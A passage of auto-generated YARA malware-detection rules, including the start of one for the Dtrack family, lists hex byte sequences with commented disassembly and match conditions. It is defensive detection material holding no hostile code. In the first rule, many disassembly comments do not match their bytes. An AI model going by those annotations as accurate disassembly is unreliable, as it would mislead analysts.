&nbsp;ebx, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;448b4124&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4585c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; ecx, eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_8 = { 4c8d0d31eb0000 c1e918 c1e808 41bf00000080 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4c8d0d31eb0000&nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x1e6<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e918&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e808&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [0xbda0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41bf00000080&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_9 = { 488bd8 4885c0 752d ff15???????? 83f857 0f85e0010000 488d0da0bd0000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;752d&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83f857&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f85e0010000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x2f<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d0da0bd0000&nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, 0x57<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_10 = { 75d4 488d1d7f6c0100 488b4bf8 4885c9 740b }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;75d4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [0xeb31]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d1d7f6c0100&nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 0x18<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4bf8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;740b&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edi, 0x80000000<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_11 = { 0f85d9000000 488d15d0c90000 41b810200100 488bcd e8???????? eb6b b9f4ffffff }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f85d9000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xffffffd6<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d15d0c90000&nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41b810200100&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, [0x16c7f]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bcd&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;eb6b&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; ecx, dword ptr [ebx - 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;b9f4ffffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_12 = { 48890d???????? 488905???????? 488d05ae610000 488905???????? 488d05a0550000 488905???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;//&nbsp; &nbsp; 48890d????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d05ae610000&nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; 488d05a0550000&nbsp; &nbsp; &nbsp; &nbsp;| je&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_13 = { 8bcf e8???????? 488b7c2448 85c0 0f8440030000 488d0560250100 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8bcf&nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 0x12010<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b7c2448&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;85c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, ebp<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f8440030000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x83<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d0560250100&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 0xfffffff4<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_14 = { ff15???????? 8b05???????? 2305???????? ba02000000 33c9 8905???????? 8b05???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b05????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;2305????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ba02000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, [0x61ae]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8905????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b05????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_15 = { 4883ec30 498bd8 e8???????? 488bc8 4885c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4883ec30&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xdf<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;498bd8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bc8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, [0xc9d0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 7 of them and filesize &lt; 557056<br>}</td>
</tr>
<tr>
<td>rule win_dtrack_auto {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_0 = { 52 8b4508 50 e8???????? 83c414 8b4d10 51 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 400<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4508&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c414&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x14<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4d10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_1 = { 3a4101 7523 83854cf6ffff02 838550f6ffff02 80bd4af6ffff00 75ae c78544f6ffff00000000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;3a4101&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;al, byte ptr [ecx + 1]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp; 7523&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x25<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83854cf6ffff02&nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9b4], 2<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;838550f6ffff02&nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9b0], 2<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;80bd4af6ffff00&nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;byte ptr [ebp - 0x9b6], 0<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;75ae&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xffffffb0<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c78544f6ffff00000000&nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9bc], 0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_2 = { 50 ff15???????? a3???????? 68???????? e8???????? 83c404 50 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;a3????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;68????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c404&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 4<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_3 = { 8d8dd4faffff 51 e8???????? 83c408 8b15???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8d8dd4faffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [ebp - 0x52c]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c408&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_4 = { 8855f5 6a5c 8b450c 50 e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8855f5&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;byte ptr [ebp - 0xb], dl<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;6a5c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x5c<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; 8b450c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 0xc]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_5 = { 51 e8???????? 83c410 8b558c 52 }<br>&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 